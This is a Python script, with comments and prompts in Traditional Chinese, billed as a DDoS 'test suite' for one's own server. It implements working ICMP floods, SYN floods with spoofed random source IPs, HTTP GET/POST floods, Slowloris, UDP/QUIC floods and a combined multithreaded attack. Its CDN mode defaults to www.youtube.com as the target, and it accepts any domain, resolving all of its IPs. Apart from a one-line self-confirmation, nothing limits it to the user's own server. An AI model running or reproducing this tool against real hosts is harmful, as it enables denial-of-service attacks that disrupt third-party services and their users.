
"""
DDoS 攻擊測試套件 - 增強版
包含多種攻擊方式，僅用於測試自己的伺服器
新功能：HTTP/2、QUIC、多IP、動態源端口、重試機制、TLS支持
"""
import socket
import threading
import time
import random
import struct
import sys
from collections import Counter
import ssl

# 嘗試導入增強功能庫
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    print("⚠️  未安裝 httpx，HTTP/2 功能將不可用")
    print("   安裝: pip install httpx")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("⚠️  未安裝 dnspython，DNS 多 IP 解析將不可用")
    print("   安裝: pip install dnspython")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("❌ 未安裝 requests 庫")
    print("   安裝: pip install requests")

# ===== 配置區 =====
# 自動取得網卡 IP
def get_local_ip():
    """自動取得本機網卡 IP (非 127.0.0.1)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "192.168.0.201"  # 備用值

TARGET_IP = "127.0.0.1"              # 本機測試 (HTTP/TCP 有效)
TARGET_IP_REAL = get_local_ip()      # 自動偵測網卡 IP (用於 ICMP)
TARGET_PORT = 8000                   # 對應 muti_server.py 的 TCP_PORT
UDP_TARGET_PORT = 9001               # 對應 muti_server.py 的 UDP_PORT
THREAD_COUNT = 50                    # 增加線程數以產生明顯效果
DURATION = 30                        # 秒

print(f"\n🌐 自動偵測到網卡 IP: {TARGET_IP_REAL}")
print(f"📌 本機測試 IP: {TARGET_IP}\n")
# ==================

class AttackStats:
    """統計資訊 - 增強版"""
    def __init__(self):
        self.packets_sent = 0
        self.connections_made = 0
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.retries = 0
        self.http2_requests = 0
        self.http3_requests = 0
        self.unique_source_ports = set()
        self.errors = Counter()
        self.lock = threading.Lock()
    
    def increment(self, metric, value=1):
        with self.lock:
            if metric == "packets":
                self.packets_sent += value
            elif metric == "connections":
                self.connections_made += value
            elif metric == "requests":
                self.requests_sent += value
            elif metric == "successful":
                self.successful_requests += value
            elif metric == "failed":
                self.failed_requests += value
            elif metric == "retries":
                self.retries += value
            elif metric == "http2":
                self.http2_requests += value
            elif metric == "http3":
                self.http3_requests += value
    
    def track_port(self, port):
        with self.lock:
            self.unique_source_ports.add(port)
    
    def add_error(self, error_type):
        with self.lock:
            self.errors[error_type] += 1
    
    def get_stats(self):
        with self.lock:
            return {
                'packets': self.packets_sent,
                'connections': self.connections_made,
                'requests': self.requests_sent,
                'successful': self.successful_requests,
                'failed': self.failed_requests,
                'retries': self.retries,
                'http2': self.http2_requests,
                'http3': self.http3_requests,
                'unique_ports': len(self.unique_source_ports),
                'errors': dict(self.errors)
            }

stats = AttackStats()
running = False
resolved_ips = []  # 存儲 DNS 解析的多個 IP

# ==================== DNS 解析工具 ====================
def resolve_target_ips(target_host):
    """解析目標主機的所有 IP 地址（IPv4 和 IPv6）"""
    if not DNS_AVAILABLE:
        # 回退到基本解析
        try:
            ip = socket.gethostbyname(target_host)
            return [('ipv4', ip)]
        except:
            return [('ipv4', target_host)]
    
    ips = []
    try:
        # 解析 A 記錄（IPv4）
        try:
            answers = dns.resolver.resolve(target_host, 'A')
            for rdata in answers:
                ips.append(('ipv4', str(rdata)))
                print(f"  [DNS] A 記錄: {rdata}")
        except:
            pass
        
        # 解析 AAAA 記錄（IPv6）
        try:
            answers = dns.resolver.resolve(target_host, 'AAAA')
            for rdata in answers:
                ips.append(('ipv6', str(rdata)))
                print(f"  [DNS] AAAA 記錄: {rdata}")
        except:
            pass
        
        # 如果是 IP 地址直接使用
        if not ips:
            try:
                socket.inet_pton(socket.AF_INET, target_host)
                ips.append(('ipv4', target_host))
            except:
                try:
                    socket.inet_pton(socket.AF_INET6, target_host)
                    ips.append(('ipv6', target_host))
                except:
                    pass
    except Exception as e:
        print(f"[DNS] 解析失敗: {e}")
    
    return ips if ips else [('ipv4', '127.0.0.1')]
resolved_ips = []  # 存儲 DNS 解析的多個 IP

# ==================== 1. ICMP Flood ====================
class ICMPFlood:
    """ICMP Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def checksum(data):
        """計算 ICMP 校驗和"""
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i] << 8) + data[i + 1]
        if n:
            s += data[-1] << 8
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s
    
    @staticmethod
    def create_icmp_packet():
        """創建 ICMP Echo Request 封包"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        # 封包標頭
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        data = b'A' * 56  # 資料部分
        
        # 計算校驗和
        icmp_checksum = ICMPFlood.checksum(header + data)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        return header + data
    
    @staticmethod
    def attack(target_ip, duration):
        """執行 ICMP Flood"""
        global running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            print(f"🔵 ICMP Flood 執行緒已啟動 → {target_ip}")
        except PermissionError:
            print("❌ ICMP Flood 需要 root/管理員權限")
            print("💡 Linux/Mac: sudo python3 script.py")
            print("💡 Windows: 以管理員身份執行")
            return
        except Exception as e:
            print(f"❌ ICMP Flood 初始化失敗: {e}")
            return
        
        while running:
            try:
                packet = ICMPFlood.create_icmp_packet()
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
                # 無延遲，盡可能快速發送
            except Exception as e:
                stats.add_error(f"ICMP: {type(e).__name__}")
                time.sleep(0.001)  # 錯誤時短暫延遲
        
        sock.close()
        print(f"🔵 ICMP Flood 執行緒已停止")

# ==================== 2. SYN Flood ====================
class SYNFlood:
    """SYN Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def create_ip_header(source_ip, dest_ip):
        """創建 IP 標頭"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel 會填充
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl,
                                ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header
    
    @staticmethod
    def create_tcp_syn(source_ip, source_port, dest_ip, dest_port):
        """創建 TCP SYN 封包"""
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1  # SYN flag
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window,
                                 tcp_check, tcp_urg_ptr)
        
        # 偽標頭用於計算校驗和
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = SYNFlood.checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window) + \
                     struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return tcp_header
    
    @staticmethod
    def checksum(msg):
        """計算校驗和"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = msg[i] << 8
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 SYN Flood"""
        global running
        try:
            # Windows 需要使用不同的 socket 類型
            import platform
            if platform.system() == 'Windows':
                # Windows: 使用 IPPROTO_IP 可以發送自訂 IP 封包
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            else:
                # Linux/Mac: 使用 IPPROTO_TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("❌ SYN Flood 需要 root/管理員權限")
            print("💡 請改用 SYN Flood (簡化版)")
            return
        except OSError as e:
            print(f"❌ SYN Flood 初始化失敗: {e}")
            print("💡 Windows 可能需要特殊網路設定或請改用選項 3")
            return
        
        print(f"🔴 SYN Flood 已啟動 → {target_ip}:{target_port}")
        
        while running:
            try:
                # 隨機源 IP 和端口
                source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = SYNFlood.create_ip_header(source_ip, target_ip)
                tcp_header = SYNFlood.create_tcp_syn(source_ip, source_port, target_ip, target_port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
            except Exception as e:
                stats.add_error(f"SYN: {type(e).__name__}")
        
        sock.close()

# ==================== 3. SYN Flood (簡化版 - 增強) ====================
class SYNFloodSimple:
    """SYN Flood 簡化版（增強：動態源端口）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """
        簡化版 SYN Flood - 每次使用不同源端口
        """
        global running
        print(f"🟡 SYN Flood (簡化版) 執行緒已啟動 → {target_ip}:{target_port}")
        
        sockets_pool = []
        
        while running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.setblocking(False)
                
                # 綁定隨機源端口
                try:
                    source_port = random.randint(10000, 65535)
                    sock.bind(('', source_port))
                    stats.track_port(source_port)
                except:
                    pass  # 端口被佔用，使用系統分配
                
                try:
                    sock.connect((target_ip, target_port))
                except (BlockingIOError, socket.error):
                    pass
                
                stats.increment("connections")
                stats.increment("requests")
                
                if len(sockets_pool) < 50:
                    sockets_pool.append(sock)
                else:
                    try:
                        sock.close()
                    except:
                        pass
                
                if len(sockets_pool) >= 50:
                    old_sock = sockets_pool.pop(0)
                    try:
                        old_sock.close()
                    except:
                        pass
                        
            except Exception as e:
                stats.add_error(f"SYN-Simple: {type(e).__name__}")
                stats.increment("failed")
                time.sleep(0.01)
        
        for sock in sockets_pool:
            try:
                sock.close()
            except:
                pass
        
        print(f"🟡 SYN Flood (簡化版) 執行緒已停止")

# ==================== 4. HTTP Request Flood (增強版) ====================
class HTTPFlood:
    """HTTP Request Flood（增強：HTTP/2、TLS、重試）"""
    
    @staticmethod
    def attack(target_url, method="GET", duration=30, use_http2=True, use_tls=True):
        """執行 HTTP Flood - 支持 HTTP/2 和 TLS"""
        global running
        print(f"🟢 HTTP {method} Flood 已啟動 → {target_url} (HTTP/2={use_http2 and HTTPX_AVAILABLE}, TLS={use_tls})")
        
        # 選擇客戶端
        if use_http2 and HTTPX_AVAILABLE:
            try:
                if use_tls and target_url.startswith('https'):
                    client = httpx.Client(http2=True, timeout=5.0, verify=True)
                else:
                    client = httpx.Client(http2=True, timeout=5.0, verify=False)
                client_type = 'httpx'
            except Exception as e:
                print(f"  httpx 初始化失敗: {e}，使用 requests")
                if REQUESTS_AVAILABLE:
                    client = requests.Session()
                    client_type = 'requests'
                else:
                    print("  無可用 HTTP 客戶端")
                    return
        elif REQUESTS_AVAILABLE:
            client = requests.Session()
            client_type = 'requests'
        else:
            print("  無可用 HTTP 客戶端")
            return
        
        paths = ["/", "/api", "/search", "/login", "/data", "/user", "/product", "/videos"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        
        max_retries = 2
        
        while running:
            retry_count = 0
            success = False
            
            while retry_count <= max_retries and not success and running:
                try:
                    url = target_url + random.choice(paths) + f"?_={random.randint(1, 999999)}"
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "DNT": "1",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "no-cache",
                        "X-Request-ID": f"{random.randint(1, 9999999)}",
                    }
                    
                    stats.increment("requests")
                    
                    if client_type == 'httpx':
                        response = client.request(method, url, headers=headers)
                        if hasattr(response, 'http_version') and response.http_version == "HTTP/2":
                            stats.increment("http2")
                    else:
                        if method == "GET":
                            response = client.get(url, headers=headers, timeout=5)
                        elif method == "POST":
                            data = {"test": random.randint(1, 10000), "ts": time.time()}
                            response = client.post(url, json=data, headers=headers, timeout=5)
                    
                    stats.increment("successful")
                    success = True
                    
                except Exception as e:
                    retry_count += 1
                    stats.increment("retries")
                    
                    if retry_count > max_retries:
                        stats.add_error(f"HTTP {type(e).__name__}")
                        stats.increment("failed")
                    else:
                        time.sleep(0.05)
        
        try:
            if hasattr(client, 'close'):
                client.close()
        except:
            pass
        
        print(f"🟢 HTTP {method} Flood 執行緒已停止")

# ==================== 5. Slowloris 攻擊 (增強版) ====================
class Slowloris:
    """Slowloris 慢速攻擊（增強：動態源端口）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 Slowloris 攻擊 - 使用不同源端口"""
        global running
        print(f"🟣 Slowloris 執行緒已啟動 → {target_ip}:{target_port}")
        
        sockets = []
        
        # 創建大量半完成的 HTTP 請求
        for _ in range(200):
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                
                # 綁定隨機源端口
                try:
                    source_port = random.randint(10000, 65535)
                    sock.bind(('', source_port))
                    stats.track_port(source_port)
                except:
                    pass
                
                sock.connect((target_ip, target_port))
                
                # 發送不完整的 HTTP 請求
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                
                sockets.append(sock)
                stats.increment("connections")
                stats.increment("requests")
            except:
                stats.increment("failed")
        
        print(f"  已建立 {len(sockets)} 個連接")
        
        # 持續發送不完整的標頭來保持連接
        while running:
            try:
                for sock in list(sockets):
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        stats.increment("packets")
                    except:
                        sockets.remove(sock)
                        stats.increment("failed")
                
                time.sleep(10)  # 每 10 秒發送一次
                
            except Exception as e:
                stats.add_error(f"Slowloris: {type(e).__name__}")
        
        # 清理
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print(f"🟣 Slowloris 執行緒已停止")

# ==================== 6. UDP Flood (增強版 - QUIC) ====================
class UDPFlood:
    """UDP Flood 攻擊（增強：QUIC 模擬、動態源端口）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 UDP Flood - 模擬 QUIC 包"""
        global running
        print(f"🔵 UDP Flood 執行緒已啟動 → {target_ip}:{target_port}")
        
        payload_sizes = [64, 128, 256, 512, 1024, 1200, 1472]
        
        while running:
            try:
                # 每次創建新 socket 使用不同源端口
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # 綁定隨機源端口
                try:
                    source_port = random.randint(10000, 65535)
                    sock.bind(('', source_port))
                    stats.track_port(source_port)
                except:
                    pass
                
                size = random.choice(payload_sizes)
                
                # 50% 機率模擬 QUIC 包格式
                if random.random() > 0.5 and size >= 1200:
                    payload = bytearray(size)
                    payload[0] = 0xC0 | random.randint(0, 15)  # Long header
                    payload[1:5] = random.randbytes(4)  # Version
                    payload[5:21] = random.randbytes(16)  # Connection ID
                    payload[21:] = random.randbytes(size - 21)
                    stats.increment("http3")
                else:
                    payload = random.randbytes(size)
                
                sock.sendto(bytes(payload), (target_ip, target_port))
                stats.increment("packets")
                stats.increment("requests")
                stats.increment("successful")
                
                sock.close()
                
            except Exception as e:
                stats.add_error(f"UDP: {type(e).__name__}")
                stats.increment("failed")
                time.sleep(0.001)
        
        print(f"🔵 UDP Flood 執行緒已停止")

# ==================== 主程式 ====================
def print_stats_loop(start_time):
    """持續顯示統計資訊 - 增強版"""
    global running
    while running:
        elapsed = time.time() - start_time
        current_stats = stats.get_stats()
        
        sys.stdout.write("\r" + " " * 200 + "\r")
        sys.stdout.write(
            f"⚡ 請求: {current_stats['requests']:,} | "
            f"成功: {current_stats['successful']:,} | "
            f"失敗: {current_stats['failed']:,} | "
            f"重試: {current_stats['retries']:,} | "
            f"HTTP/2: {current_stats['http2']:,} | "
            f"QUIC: {current_stats['http3']:,} | "
            f"源端口: {current_stats['unique_ports']:,} | "
            f"時間: {elapsed:.1f}s"
        )
        sys.stdout.flush()
        
        time.sleep(0.5)

def run_attack_suite():
    """執行攻擊測試套件 - 增強版"""
    global running, resolved_ips
    
    print("="*80)
    print("💣 DDoS 攻擊測試套件 - 增強版")
    print("="*80)
    print("新功能:")
    print("  ✅ HTTP/2 支持 (需 httpx)")
    print("  ✅ QUIC/HTTP3 模擬")
    print("  ✅ 動態源端口")
    print("  ✅ DNS 多 IP 解析")
    print("  ✅ 自動重試機制")
    print("  ✅ TLS/SSL 支持")
    print("="*80)
    print("選擇攻擊類型:")
    print("1. ICMP Flood (需要管理員) - ⚠️ 127.0.0.1 無效，需用網卡 IP")
    print("2. SYN Flood (需要管理員) - ⚠️ Windows 防火牆會攔截")
    print("3. SYN Flood 簡化版 ✅ - 半開連接攻擊 + 動態源端口")
    print("4. HTTP GET Flood ✅ - HTTP/2 + TLS + 重試")
    print("5. HTTP POST Flood ✅ - HTTP/2 + TLS + 重試")
    print("6. Slowloris ✅ - 連接耗盡 + 動態源端口")
    print("7. UDP Flood ✅ - QUIC 模擬 + 動態源端口")
    print("8. 組合攻擊 (3+4+6) 🔥 - 多重攻擊")
    print("9. YouTube/CDN 測試 🌐 - 真實瀏覽器模擬 (HTTPS + HTTP/2)")
    print("="*80)
    
    choice = input("\n選擇攻擊類型 (1-9): ").strip()
    
    # 根據選擇決定目標
    if choice == "9":
        # YouTube/CDN 測試
        target_host = input("\n輸入目標域名 (如 www.youtube.com): ").strip()
        if not target_host:
            target_host = "www.youtube.com"
        
        print(f"\n🔍 DNS 解析中: {target_host}")
        resolved_ips = resolve_target_ips(target_host)
        print(f"✅ 解析到 {len(resolved_ips)} 個 IP:")
        for ip_type, ip in resolved_ips:
            print(f"   {ip_type}: {ip}")
        
        target_url = f"https://{target_host}"
        use_https = True
    elif choice in ["4", "5"]:
        # HTTP 測試 - 詢問是否使用域名
        use_domain = input("\n使用域名測試? (y/n，默認 n 使用本機): ").strip().lower()
        if use_domain == 'y':
            target_host = input("輸入目標域名: ").strip()
            protocol = input("使用 HTTPS? (y/n): ").strip().lower()
            protocol = "https" if protocol == 'y' else "http"
            
            print(f"\n🔍 DNS 解析中: {target_host}")
            resolved_ips = resolve_target_ips(target_host)
            print(f"✅ 解析到 {len(resolved_ips)} 個 IP:")
            for ip_type, ip in resolved_ips:
                print(f"   {ip_type}: {ip}")
            
            target_url = f"{protocol}://{target_host}"
            use_https = (protocol == "https")
        else:
            target_ip = TARGET_IP
            resolved_ips = [('ipv4', target_ip)]
            target_url = f"http://{target_ip}:{TARGET_PORT}"
            use_https = False
    elif choice == "1" and TARGET_IP_REAL:
        target_ip = TARGET_IP_REAL
        resolved_ips = [('ipv4', target_ip)]
        print(f"\n💡 使用網卡 IP: {target_ip} (ICMP 測試)")
    else:
        target_ip = TARGET_IP
        resolved_ips = [('ipv4', target_ip)]
    
    if choice != "9":
        confirm = input(f"\n⚠️  目標: {resolved_ips}\n⚠️  請確認這是你自己的伺服器 (y/no): ")
    else:
        confirm = input(f"\n⚠️  目標: {target_host} ({len(resolved_ips)} IPs)\n⚠️  這是 CDN 壓力測試，請確認你有權限測試 (y/no): ")
    
    if confirm.lower() != "y":
        print("❌ 測試已取消")
        return
    
    print(f"\n🚀 啟動攻擊... (持續 {DURATION} 秒)")
    print(f"💡 提示: 同時開啟 muti_server.py 以監控攻擊效果\n")
    
    running = True
    threads = []
    start_time = time.time()
    
    # 啟動統計顯示執行緒
    stats_thread = threading.Thread(target=print_stats_loop, args=(start_time,), daemon=True)
    stats_thread.start()
    
    # 計算每個 IP 的線程數
    threads_per_ip = max(1, THREAD_COUNT // len(resolved_ips))
    
    if choice == "1":
        # ICMP Flood
        if target_ip == "127.0.0.1":
            print("\n⚠️  警告: ICMP 對 127.0.0.1 無效!")
            print("   請修改腳本中的 TARGET_IP_REAL 為網卡 IP")
            print("   例如: TARGET_IP_REAL = '192.168.0.201'")
            alt = input("\n繼續測試? (y/n): ").strip().lower()
            if alt != 'y':
                return
        
        print(f"🔵 啟動 {THREAD_COUNT} 個 ICMP Flood 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=ICMPFlood.attack, args=(target_ip, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "2":
        # SYN Flood
        print("\n⚠️  注意: Windows 防火牆會攔截偽造封包")
        print("   建議:")
        print("   1. 暫時關閉防火牆: 控制台 → Windows Defender 防火牆 → 關閉")
        print("   2. 或使用選項 3 (SYN Flood 簡化版)")
        alt = input("\n繼續測試? (y/n): ").strip().lower()
        if alt != 'y':
            return
        
        print(f"🔴 啟動 {THREAD_COUNT} 個 SYN Flood 執行緒...\n")
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=SYNFlood.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "3":
        # SYN Flood 簡化版 - 多 IP
        print(f"🟡 對 {len(resolved_ips)} 個 IP 啟動 SYN Flood (簡化版)...\n")
        for ip_type, ip_addr in resolved_ips:
            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
            for _ in range(threads_per_ip):
                t = threading.Thread(target=SYNFloodSimple.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "4":
        # HTTP GET Flood - 多 IP
        print(f"🟢 對 {len(resolved_ips)} 個目標啟動 HTTP GET Flood...\n")
        for ip_type, ip_addr in resolved_ips:
            if choice == "9" or 'use_https' in locals() and use_https:
                url = target_url
            else:
                url = f"http://{ip_addr}:{TARGET_PORT}"
            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
            for _ in range(threads_per_ip):
                use_h2 = HTTPX_AVAILABLE and ('use_https' in locals() and use_https)
                t = threading.Thread(target=HTTPFlood.attack, args=(url, "GET", DURATION, use_h2, 'use_https' in locals() and use_https), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "5":
        # HTTP POST Flood - 多 IP
        print(f"🟢 對 {len(resolved_ips)} 個目標啟動 HTTP POST Flood...\n")
        for ip_type, ip_addr in resolved_ips:
            if choice == "9" or 'use_https' in locals() and use_https:
                url = target_url
            else:
                url = f"http://{ip_addr}:{TARGET_PORT}"
            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
            for _ in range(threads_per_ip):
                use_h2 = HTTPX_AVAILABLE and ('use_https' in locals() and use_https)
                t = threading.Thread(target=HTTPFlood.attack, args=(url, "POST", DURATION, use_h2, 'use_https' in locals() and use_https), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "6":
        # Slowloris - 多 IP
        print(f"🟣 對 {len(resolved_ips)} 個 IP 啟動 Slowloris...\n")
        for ip_type, ip_addr in resolved_ips:
            slowloris_threads = min(10, threads_per_ip)
            print(f"  [{ip_type}] {ip_addr}: {slowloris_threads} 線程")
            for _ in range(slowloris_threads):
                t = threading.Thread(target=Slowloris.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "7":
        # UDP Flood - 多 IP
        print(f"🔵 對 {len(resolved_ips)} 個 IP 啟動 UDP Flood (QUIC 模擬)...\n")
        for ip_type, ip_addr in resolved_ips:
            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
            for _ in range(threads_per_ip):
                t = threading.Thread(target=UDPFlood.attack, args=(ip_addr, UDP_TARGET_PORT, DURATION), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "8":
        # 組合攻擊 - 多 IP
        print(f"🔥 對 {len(resolved_ips)} 個 IP 啟動組合攻擊:\n")
        
        for ip_type, ip_addr in resolved_ips:
            print(f"  [{ip_type}] {ip_addr}:")
            
            # SYN Flood
            syn_threads = threads_per_ip // 3
            print(f"    - SYN Flood: {syn_threads} 線程")
            for _ in range(syn_threads):
                t = threading.Thread(target=SYNFloodSimple.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
                t.start()
                threads.append(t)
            
            # HTTP Flood
            http_threads = threads_per_ip // 3
            print(f"    - HTTP GET: {http_threads} 線程")
            url = f"http://{ip_addr}:{TARGET_PORT}"
            for _ in range(http_threads):
                t = threading.Thread(target=HTTPFlood.attack, args=(url, "GET", DURATION, False, False), daemon=True)
                t.start()
                threads.append(t)
            
            # Slowloris
            slow_threads = min(5, threads_per_ip // 10)
            print(f"    - Slowloris: {slow_threads} 線程")
            for _ in range(slow_threads):
                t = threading.Thread(target=Slowloris.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
                t.start()
                threads.append(t)
    
    elif choice == "9":
        # YouTube/CDN 專用測試
        print(f"🌐 對 CDN ({len(resolved_ips)} IPs) 啟動真實瀏覽器模擬...\n")
        print(f"   使用 HTTPS + HTTP/2 + TLS + 完整標頭")
        
        for ip_type, ip_addr in resolved_ips:
            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
            for _ in range(threads_per_ip):
                t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION, True, True), daemon=True)
                t.start()
                threads.append(t)
    
    else:
        print("❌ 無效選擇")
        running = False
        return
    
    print(f"\n📊 已啟動 {len(threads)} 個攻擊線程")
    print(f"🎯 目標 IP 數量: {len(resolved_ips)}")
    
    # 等待指定時間或 Ctrl+C
    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n\n⏹️  收到中斷信號...")
    
    running = False
    elapsed = time.time() - start_time
    
    # 等待執行緒結束
    for t in threads:
        t.join(timeout=1)
    
    # 最終統計 - 增強版
    final_stats = stats.get_stats()
    print("\n\n" + "="*80)
    print("📊 攻擊測試完成")
    print("="*80)
    print(f"執行時間: {elapsed:.2f} 秒")
    print(f"\n📦 基礎統計:")
    print(f"  發送封包: {final_stats['packets']:,}")
    print(f"  建立連接: {final_stats['connections']:,}")
    
    print(f"\n🎯 請求統計:")
    print(f"  總請求數: {final_stats['requests']:,}")
    print(f"  成功請求: {final_stats['successful']:,}")
    print(f"  失敗請求: {final_stats['failed']:,}")
    print(f"  重試次數: {final_stats['retries']:,}")
    if final_stats['requests'] > 0:
        success_rate = (final_stats['successful'] / final_stats['requests']) * 100
        print(f"  成功率: {success_rate:.2f}%")
    
    print(f"\n🚀 協議統計:")
    print(f"  HTTP/2 請求: {final_stats['http2']:,}")
    print(f"  QUIC/HTTP3 包: {final_stats['http3']:,}")
    
    print(f"\n🌐 網絡統計:")
    print(f"  使用的源端口: {final_stats['unique_ports']:,}")
    print(f"  目標 IP 數量: {len(resolved_ips)}")
    
    if final_stats['errors']:
        print(f"\n❌ 錯誤統計:")
        for error, count in final_stats['errors'].most_common(5):
            print(f"  {error}: {count:,}")
    
    print("="*80)

if __name__ == "__main__":
    run_attack_suite()